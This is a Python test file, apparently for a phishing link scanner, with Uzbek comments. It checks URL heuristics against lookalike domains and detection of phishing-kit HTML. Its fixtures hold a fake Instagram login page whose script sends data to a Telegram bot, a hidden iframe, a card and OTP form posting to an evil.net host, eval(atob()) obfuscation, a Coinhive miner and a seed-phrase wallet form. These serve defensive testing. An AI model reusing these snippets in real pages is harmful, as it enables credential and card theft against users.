"""Havola skaneri qoidalari (tarmoqsiz): URL evristikasi va HTML tahlili. Yolg'on musbatlarni ham tekshiradi."""
from app.services import urlscan as U
from app.services import urlscan_rules as R


def fx(url, popular=False):
    t = U.parse_target(url)
    return U.heuristics(t, popular=popular)


def serious(url, popular=False):
    return [x for x in fx(url, popular) if x["sev"] != "info"]


def html(body, url="https://example-shop.com/", official=lambda b: False):
    return R.analyze_html(body.encode(), url, is_official_for=official)


def texts(res):
    return " | ".join(x["text"] for x in res["findings"])


def test_legit_urls_have_no_serious_findings():
    for u in ["https://www.instagram.com/reel/abc/", "https://github.com/", "https://pineapple.com/", "https://mail.google.com/",
              "https://click.uz/", "https://my.gov.uz/uz", "https://uzum.uz/", "https://www.humocard.uz/", "https://clickfunnels.com/",
              "https://click-and-collect.com/", "https://olx.uz/", "https://nbu.uz/", "https://kun.uz/news/2024/01/01/x", "https://payme.uz/home",
              "https://soliq.uz/", "https://docs.python.org/3/", "https://www.youtube.com/watch?v=abc"]:
        assert serious(u) == [], u


def test_uzbek_brand_phishing_is_flagged_strong():
    for u in ["https://payme-uz.top/login", "https://click-uz-bonus.xyz/", "https://uzcard-karta.com/", "https://anorbank.uz.kirish.cc/",
              "https://soliq-uz.info/tasdiqlash", "https://my-gov-uz.xyz/", "https://instagram-login.pages.dev/"]:
        assert any(x.get("strong") for x in fx(u)), u


def test_homoglyph_and_mixed_script():
    r = fx("https://xn--80ak6aa92e.com/")           # аррӏе.com (kirill)
    assert any("o'xshash harflar" in x["text"] and x.get("strong") for x in r)
    mixed = "https://xn--pple-43d.com/"             # lotin 'pple' + kirill 'а'
    assert any("aralash" in x["text"] for x in fx(mixed))


def test_free_hosting_and_random_domains():
    assert any("Bepul hosting" in x["text"] and x["sev"] == "warn" for x in fx("https://secure-login.workers.dev/"))
    assert [x["sev"] for x in fx("https://my-app.vercel.app/")] == ["info"]
    assert any("tasodifiy" in x["text"] for x in fx("https://xkjqwpzrtlmvbn23.com/"))
    assert not any("tasodifiy" in x["text"] for x in fx("https://xkjqwpzrtlmvbn23.com/", popular=True))


def test_path_brand_and_open_redirect_param():
    assert any("yo'lida" in x["text"] for x in fx("https://evil.com/instagram/login"))
    assert any("yo'naltiruvchi parametr" in x["text"] for x in fx("https://evil.com/?url=https://google.com"))
    assert fx("https://example.com/?next=/profile") == []


def test_popular_flag_suppresses_lookalike_noise():
    assert any(x.get("strong") for x in fx("https://paypa1.com/"))
    assert not any(x.get("strong") for x in fx("https://paypa1.com/", popular=True))


# ------------------------------------------------------------------------------- HTML

PHISH = """<html><head><title>Instagram - Kirish</title></head><body oncontextmenu="return false"><h1>Instagram</h1>
<form action="/p.php" method="post"><input name="u"><input type="password" name="p"></form>
<script>fetch("https://api.telegram.org/bot123:ABC/sendMessage?text="+x)</script>
<iframe src="https://o.example/x" width="0" height="0"></iframe><a href="/dl/instagram.apk">Yuklab olish</a></body></html>"""


def test_html_phishing_kit_signals():
    r = html(PHISH, "https://insta-gram-login.xyz/")
    t = texts(r)
    assert "Telegram bot" in t and "yashirin" in t and ".apk" in t and "«instagram» deb ko'rsatadi" in t
    assert any(x.get("strong") for x in r["findings"])
    assert r["facts"]["password"] and r["facts"]["exfil"] == ["Telegram bot"] and r["facts"]["brand"] == "instagram"


def test_html_official_domain_login_is_clean():
    lg = '<title>Log in • Instagram</title><form action="/login/" method="post"><input name="u"><input type="password" name="p"></form>'
    assert html(lg, "https://www.instagram.com/accounts/login/", official=lambda b: b == "instagram")["findings"] == []


def test_html_card_and_otp_fields():
    card = '<title>To\'lov</title><form action="https://pay.evil.net/x"><input name="card_number" placeholder="Karta raqami"><input name="cvv">' \
           '<input autocomplete="one-time-code" name="sms"></form>'
    r = html(card, "https://pay-karta.top/")
    assert "bank kartasi" in texts(r) and "SMS/OTP" in texts(r) and r["facts"]["ext_form"] == ["pay.evil.net"]
    assert "shifrlanmagan (http)" in texts(html(card, "http://pay-karta.top/"))
    # rasmiy domen: karta maydoni oddiy hol
    assert html(card, "https://pay.payme.uz/", official=lambda b: True)["findings"] == []


def test_html_obfuscation_miner_seed_wallet():
    r = html('<title>x</title><script>eval(atob("ZG9jdW1lbnQ="));</script><script src="https://coinhive.com/lib/coinhive.min.js"></script>')
    assert "yashirilgan" in texts(r) and "mayner" in texts(r)
    r = html('<title>Claim airdrop</title><form><input name="seed_phrase"></form><script>window.ethereum.request({})</script>')
    assert "seed-ibora" in texts(r) and "hamyon" in texts(r)


def test_html_clean_blog_has_no_findings_and_broken_html_is_safe():
    blog = "<html><head><title>How to use Instagram for business</title></head><body><h1>Tips</h1><p>" + "Lorem ipsum. " * 300 + \
           '</p><form action="/search"><input name="q"></form><script src="https://www.googletagmanager.com/gtag/js"></script></body></html>'
    assert html(blog, "https://marketingblog.com/post")["findings"] == []
    assert html("<html><title>a</title><form><input type=password>", "https://x.com/")["facts"]["password"] is True
    assert html("", "https://x.com/")["findings"] == []


def test_html_scam_text_only_with_form():
    f = '<title>Tabriklaymiz</title><body>Tabriklaymiz! Siz yutdingiz — yutuqni oling</body><form><input name="phone"></form>'
    assert "aldov" in texts(html(f, "https://promo-uz.top/"))


def test_compare_views_cloaking_and_waf():
    a = {"host": "a.com", "status": 200, "title": "Bank", "password": True}
    b = {"host": "b.net", "status": 200, "title": "Bank", "password": False}
    d = R.compare_views(a, b)
    assert {x["sev"] for x in d} == {"warn"} and len(d) == 2
    waf = R.compare_views({"host": "a.com", "status": 403, "title": "", "password": False}, {"host": "a.com", "status": 200, "title": "Shop", "password": False})
    assert all(x["sev"] == "info" for x in waf)
    store = R.compare_views({"host": "a.com", "status": 200, "title": "x", "password": False}, {"host": "apps.apple.com", "status": 200, "title": "x", "password": False})
    assert store == []
